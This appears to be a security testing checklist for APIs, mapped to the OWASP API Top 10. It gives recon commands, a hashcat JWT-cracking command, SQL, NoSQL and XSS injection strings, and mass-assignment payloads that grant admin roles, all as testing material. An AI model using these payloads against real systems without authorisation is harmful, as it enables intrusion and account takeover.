# API Master Checklist — Checklist

API security **master checklist** mapped to the OWASP API Security Top 10 (2023) — BOLA/BFLA/BOPLA authz spine, per-phase, impact-first.

*595 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## API-0001 — Public Swagger / OpenAPI indexed by search engines
**Phase:** 1-Passive Recon · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Google dorks: site:target.com inurl:swagger | inurl:api-docs | inurl:openapi.json | intitle:"Swagger UI" | ext:json "openapi"<br>2. Open results, extract endpoints<br>3. Save schema for offline analysis

**Expected Result:** Documentation should not be publicly indexed in production

**Payload / PoC Example:**

```
site:target.com inurl:swagger.json
```

**Impact:** Free endpoint inventory; reveals shadow APIs and admin paths

**Tools:** Google,DuckDuckGo,Shodan

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0002 — Public Postman workspace leak
**Phase:** 1-Passive Recon · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Visit postman.com/search?q=target.com&amp;type=team<br>2. Search for collections referencing target<br>3. Pull collection JSON, extract endpoints + auth headers

**Expected Result:** Internal Postman collections should be private

**Payload / PoC Example:**

```
target.com OR target_api OR target.dev
```

**Impact:** Internal endpoints + sometimes hardcoded tokens

**Tools:** Postman web

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0003 — Wayback / OTX historical endpoints
**Phase:** 1-Passive Recon · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. gau target.com | grep -E "(api|/v[0-9]+|/graphql|/internal)"<br>2. waybackurls target.com | sort -u<br>3. Diff with current to find removed-but-still-live endpoints

**Expected Result:** Old endpoints should be properly retired

**Payload / PoC Example:**

```
gau target.com | grep -i graphql
```

**Impact:** Shadow / deprecated endpoints often missing patches

**Tools:** gau,waybackurls,otxurls

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0004 — GitHub leaked API keys and configs
**Phase:** 1-Passive Recon · **Category:** Secrets · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. GitDorker with token on org and personal repos<br>2. Search: org:target "api_key" / filename:.env / "target.com/api" Bearer<br>3. Validate any leaked key against API

**Expected Result:** Secrets should never be committed; rotated immediately if leaked

**Payload / PoC Example:**

```
trufflehog github --org=target --token=$GH
```

**Impact:** Direct unauth API access; cloud takeover

**Tools:** GitDorker,trufflehog,gitleaks,noseyparker

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API8:2023 Security Misconfiguration

---

## API-0005 — Mobile APK / IPA static analysis for endpoints and secrets
**Phase:** 1-Passive Recon · **Category:** Secrets · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Pull APK from APKMirror or official source<br>2. apktool d app.apk; jadx-gui to read<br>3. grep -RniE "https?://|api_key|secret|/v[0-9]+/|/api/" .<br>4. Extract gRPC .proto and OAuth client_secret if present

**Expected Result:** Client apps should not embed long-lived secrets

**Payload / PoC Example:**

```
strings app.apk | grep -E "api_key|client_secret"
```

**Impact:** Hardcoded keys = full unauth access

**Tools:** apktool,jadx,MobSF,Frida

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API8:2023 Security Misconfiguration

---

## API-0006 — Weak JWT Secret Brute Force
**Phase:** 1-Passive Recon · **Category:** Secrets · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Capture JWT token<br>2. Attempt to brute force secret<br>3. Try common secrets (secret password etc.)

**Expected Result:** Should use strong random secret (256+ bits)

**Payload / PoC Example:**

```
Try common secrets: secret, key, password123
```

**Impact:** Leaked keys/tokens grant direct authenticated access

**Tools:** jwt_tool, hashcat

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API2:2023 Broken Authentication

---

## API-0007 — Leaked API Key Not Revocable
**Phase:** 1-Passive Recon · **Category:** Secrets · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management — Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Report compromised key<br>2. Check revocation process<br>3. Test if still works

**Expected Result:** Should have instant revocation capability

**Payload / PoC Example:**

```
Compromised key still active
```

**Impact:** Leaked keys/tokens grant direct authenticated access

**Tools:** Manual

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API2:2023 Broken Authentication

---

## API-0008 — JWT Secret Key Brute Force
**Phase:** 1-Passive Recon · **Category:** Secrets · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Capture JWT token<br><br>2. Use jwt_tool or hashcat to crack secret<br><br>3. Test common secrets (secret, password, key123)<br><br>4. Forge new token with cracked secret

**Expected Result:** Should use strong random secret (256+ bits)

**Payload / PoC Example:**

```
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**Impact:** Leaked keys/tokens grant direct authenticated access

**Tools:** jwt_tool/hashcat

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API2:2023 Broken Authentication

---

## API-0009 — Hardcoded Secrets in Mobile App
**Phase:** 1-Passive Recon · **Category:** Secrets · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Decompile mobile application<br><br>2. Search for hardcoded secrets<br><br>3. Extract API keys and credentials<br><br>4. Abuse exposed secrets

**Expected Result:** Should not embed secrets in mobile apps

**Payload / PoC Example:**

```
API keys in decompiled app code
```

**Impact:** Leaked keys/tokens grant direct authenticated access

**Tools:** jadx/apktool

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API8:2023 Security Misconfiguration

---

## API-0010 — Subdomain and host enumeration
**Phase:** 2-Active Recon · **Category:** Discovery · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Recon — external attack surface (endpoints/params)

**Test Steps:** 1. subfinder/amass/chaos -&gt; dnsx -&gt; httpx<br>2. Look for api.* graph.* gateway.* dev.* stg.* internal.* legacy.* partner.* mobile.* gRPC ports 50051/443/8443

**Expected Result:** Sensitive subdomains should not be exposed

**Payload / PoC Example:**

```
subfinder -d target.com -all | dnsx | httpx -title -tech
```

**Impact:** Surface enlargement; staging often unauth

**Tools:** subfinder,amass,chaos,dnsx,httpx

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0011 — REST endpoint brute force
**Phase:** 2-Active Recon · **Category:** Discovery · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Recon — external attack surface (endpoints/params)

**Test Steps:** 1. ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt -mc all -fc 404 -recursion<br>2. kr scan https://api.target.com -A=apiroutes-211008<br>3. feroxbuster -u https://api.target.com -x json -d 4

**Expected Result:** Hidden endpoints should require auth

**Payload / PoC Example:**

```
ffuf -u https://api.target.com/FUZZ -w SecLists/Discovery/Web-Content/api/
```

**Impact:** Find unauth admin/internal endpoints

**Tools:** ffuf,kiterunner,feroxbuster,dirsearch

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0012 — JS file extraction and endpoint mining
**Phase:** 2-Active Recon · **Category:** Discovery · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Client JavaScript / source maps (endpoints &amp; params)

**Test Steps:** 1. katana -u https://target.com -jc -d 5<br>2. Save all .js URLs; download<br>3. LinkFinder + SecretFinder over JS<br>4. Note unique paths and tokens

**Expected Result:** Production JS should not contain dev endpoints or secrets

**Payload / PoC Example:**

```
python3 LinkFinder.py -i alljs.txt -o cli
```

**Impact:** Shadow APIs + leaked tokens

**Tools:** katana,LinkFinder,SecretFinder,JSFScan

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API9:2023 Improper Inventory Management

---

## API-0013 — Parameter mining
**Phase:** 2-Active Recon · **Category:** Discovery · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST Recon — external attack surface (endpoints/params)

**Test Steps:** 1. arjun -u https://api.target.com/v1/users -m GET,POST,JSON<br>2. Burp Param Miner -&gt; Guess JSON params and headers<br>3. Test discovered params for IDOR/mass-assignment

**Expected Result:** Server should ignore unknown parameters

**Payload / PoC Example:**

```
arjun -u URL -m JSON -t 30
```

**Impact:** Hidden params often bypass auth/business checks

**Tools:** arjun,paramspider,x8,Burp Param Miner

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API3:2023 Broken Object Property Level Authorization

---

## API-0014 — API Resource Enumeration
**Phase:** 2-Active Recon · **Category:** Discovery · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read Resource — Recon — external attack surface (endpoints/params)

**Test Steps:** 1. Enumerate sequential IDs<br>2. Extract all resources<br>3. Check access control

**Expected Result:** Should implement authorization checks and non-sequential IDs

**Payload / PoC Example:**

```
GET /api/users/1, /api/users/2, ..., /api/users/1000
```

**Impact:** Endpoint/attack-surface discovery; exposes shadow &amp; admin APIs

**Tools:** Burp Intruder

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API1:2023 Broken Object Level Authorization

---

## API-0015 — UUID/GUID Enumeration
**Phase:** 2-Active Recon · **Category:** Discovery · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Read Resource — Recon — external attack surface (endpoints/params)

**Test Steps:** 1. Collect multiple UUIDs<br>2. Analyze patterns<br>3. Attempt prediction

**Expected Result:** Should use cryptographically random UUIDs

**Payload / PoC Example:**

```
Analyze UUID version and attempt prediction
```

**Impact:** Endpoint/attack-surface discovery; exposes shadow &amp; admin APIs

**Tools:** Custom Script

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API1:2023 Broken Object Level Authorization

---

## API-0016 — GraphQL endpoint discovery
**Phase:** 2-Active Recon · **Category:** GraphQL · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Try /graphql /api/graphql /v1/graphql /gql /query /graphiql /playground /altair<br>2. Send {"query":"{__typename}"}; 200 confirms<br>3. Run introspection; if disabled use clairvoyance

**Expected Result:** GraphQL endpoint should not be exposed without authn

**Payload / PoC Example:**

```
{"query":"{__typename}"}
```

**Impact:** Schema discovery; unauth queries

**Tools:** InQL,graphql-cop,clairvoyance

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0017 — WebSocket endpoint discovery
**Phase:** 2-Active Recon · **Category:** WebSocket · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** WebSocket handshake (Origin) &amp; messages

**Test Steps:** 1. Inspect browser DevTools Network -&gt; WS<br>2. Try /ws /socket /api/ws /notifications /events /stream /realtime<br>3. wscat -c wss://target.com/ws -H "Authorization: Bearer X"

**Expected Result:** Authentication required for WS connections

**Payload / PoC Example:**

```
wscat -c wss://target.com/ws
```

**Impact:** Real-time channels often weakly authorized

**Tools:** wscat,websocat,Burp WS

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); Christian Schneider CSWSH; PortSwigger Academy WebSockets; OWASP WSTG; API9:2023 Improper Inventory Management

---

## API-0018 — gRPC server reflection enabled
**Phase:** 2-Active Recon · **Category:** gRPC · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. grpcurl -plaintext target:50051 list<br>2. grpcurl -plaintext target:50051 describe svc.Service<br>3. Invoke admin RPCs as unauth user

**Expected Result:** gRPC reflection disabled in production

**Payload / PoC Example:**

```
grpcurl -plaintext target.com:443 list
```

**Impact:** Full method enumeration -&gt; BFLA

**Tools:** grpcurl,Burp gRPC plugin

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0019 — HTTP method enumeration per endpoint
**Phase:** 3-Surface Mapping · **Category:** Discovery · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** MULTI Recon — external attack surface (endpoints/params)

**Test Steps:** 1. For each path test GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT PROPFIND COPY MOVE LOCK<br>2. Also test X-HTTP-Method-Override and ?_method= override<br>3. Compare responses

**Expected Result:** Disallowed methods should return 405

**Payload / PoC Example:**

```
OPTIONS /api/users HTTP/1.1
```

**Impact:** Hidden method may bypass authz checks

**Tools:** Burp Suite,curl

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API5:2023 Broken Function Level Authorization

---

## API-0020 — Content-Type matrix testing
**Phase:** 3-Surface Mapping · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Resend each POST/PUT with application/json application/xml x-www-form-urlencoded multipart text/xml application/yaml<br>2. Diff responses to find alternate parsers<br>3. Look for XXE/SSTI/mass-assign on alt parsers

**Expected Result:** Server should reject unsupported content types or use one safe parser

**Payload / PoC Example:**

```
Content-Type: application/xml with same JSON body
```

**Impact:** Alt parsers expose XXE/deserialization

**Tools:** Burp Repeater

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0021 — Privilege escalation via registration mass assignment
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Registration endpoint — signup fields

**Test Steps:** 1. Intercept POST /register<br>2. Add isAdmin/role/emailVerified/plan/tenantId fields<br>3. Submit and login; verify admin access

**Expected Result:** Server should ignore unauthorized fields

**Payload / PoC Example:**

```
{"email":"x@x","role":"admin","isAdmin":true,"emailVerified":true,"tenantId":1}
```

**Impact:** Instant admin / app compromise

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API3:2023 Broken Object Property Level Authorization

---

## API-0022 — SQL Injection in Registration Fields
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Intercept registration request<br>2. Inject SQL payloads in username/email/password fields<br>3. Observe response

**Expected Result:** Application should reject with proper validation error

**Payload / PoC Example:**

```
username: admin' OR '1'='1' --
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite, SQLMap, OWASP ZAP

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0023 — NoSQL Injection in Registration
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Send registration with NoSQL injection payloads<br>2. Try bypassing validation<br>3. Check database behavior

**Expected Result:** Should validate input, reject malicious payloads

**Payload / PoC Example:**

```
email: {"$ne": null}
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite, NoSQLMap

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0024 — XSS in Registration Fields
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register with XSS payloads in all fields<br>2. Login and check if script executes<br>3. Check profile page

**Expected Result:** Input should be sanitized and encoded

**Payload / PoC Example:**

```
name: <script>alert('XSS')</script>
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite, XSStrike

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0025 — Weak Password Policy
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Try registering with weak passwords (123 password etc.)<br>2. Test password length limits<br>3. Check special character requirements

**Expected Result:** Should enforce strong password policy

**Payload / PoC Example:**

```
password: 123456
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Manual/Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0026 — Email Enumeration via Response
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register with existing email<br>2. Register with new email<br>3. Compare response times and messages

**Expected Result:** Should not disclose if email exists

**Payload / PoC Example:**

```
email: existing@test.com vs new@test.com
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite/Custom Script

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0027 — Mass Account Creation (No Rate Limiting)
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Send multiple registration requests rapidly<br>2. Use automation to create 100+ accounts<br>3. Check if rate limiting exists

**Expected Result:** Should implement rate limiting after N requests

**Payload / PoC Example:**

```
Automated loop of registration requests
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Intruder, Custom Script

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0028 — Duplicate Registration Prevention
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register user with email A<br>2. Try registering again with same email<br>3. Check response

**Expected Result:** Should prevent duplicate registrations

**Payload / PoC Example:**

```
email: duplicate@test.com (twice)
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0029 — Parameter Pollution in Registration
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Send multiple same parameters<br>2. Try array injection<br>3. Check which value gets processed

**Expected Result:** Should handle gracefully, use first/last consistently

**Payload / PoC Example:**

```
email=user1@test.com&email=admin@test.com
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0030 — Mass Assignment - Add Admin Role
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Intercept registration request<br>2. Add role/isAdmin parameters<br>3. Check if user gets elevated privileges

**Expected Result:** Should ignore unauthorized parameters

**Payload / PoC Example:**

```
POST /register {"email":"test@test.com", "role":"admin", "isAdmin":true}
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0031 — CAPTCHA Bypass
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register without CAPTCHA token<br>2. Reuse old CAPTCHA token<br>3. Use invalid CAPTCHA

**Expected Result:** Should validate CAPTCHA on server-side

**Payload / PoC Example:**

```
captcha: null or captcha: old_token
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Manual/Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0032 — Email Verification Bypass
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register and get verification link<br>2. Try accessing app without verification<br>3. Modify verification tokens

**Expected Result:** Should block unverified users from accessing resources

**Payload / PoC Example:**

```
Skip verification step, access /dashboard directly
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0033 — HTML Injection in Registration
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register with HTML payload<br>2. Check email templates<br>3. View profile page

**Expected Result:** Should encode HTML entities

**Payload / PoC Example:**

```
name: <h1>Admin</h1><img src=x>
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0034 — IDOR in Email Verification
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Get verification token for User A<br>2. Try to verify User B with User A's token pattern<br>3. Enumerate verification tokens

**Expected Result:** Each token should be unique and non-predictable

**Payload / PoC Example:**

```
GET /verify?token=sequential_number or /verify?userId=2&token=123
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API1:2023 Broken Object Level Authorization

---

## API-0035 — Response Manipulation - Add Admin
